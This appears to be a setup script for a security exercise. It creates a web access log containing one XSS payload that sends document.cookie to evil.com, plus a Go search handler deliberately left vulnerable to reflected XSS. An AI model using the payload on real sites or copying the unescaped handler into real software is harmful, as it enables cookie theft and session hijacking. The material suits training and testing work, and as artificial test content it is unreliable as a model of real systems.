#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip golang
    pip3 install pytest

    mkdir -p /home/user/service

    cat << 'EOF' > /home/user/service/access.log
192.168.1.100 - - [14/Nov/2023:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1024
192.168.1.101 - - [14/Nov/2023:10:01:23 +0000] "GET /api/status HTTP/1.1" 200 512
10.55.20.13 - - [14/Nov/2023:10:05:11 +0000] "GET /search?query=<script>fetch('http://evil.com/?c='+document.cookie)</script> HTTP/1.1" 200 1044
192.168.1.102 - - [14/Nov/2023:10:06:00 +0000] "GET /about.html HTTP/1.1" 200 2048
EOF

    cat << 'EOF' > /home/user/service/server.go
package main

import (
	"fmt"
	"net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query().Get("query")
	// Vulnerable to XSS
	fmt.Fprintf(w, "<html><body>Search results for: %s</body></html>", query)
}

func main() {
	http.HandleFunc("/search", handler)
	// Service listening port
	http.ListenAndServe(":8443", nil)
}
EOF

    echo -n "ELF_SIMULATED_BINARY_DATA_998877665544" > /home/user/service/server

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
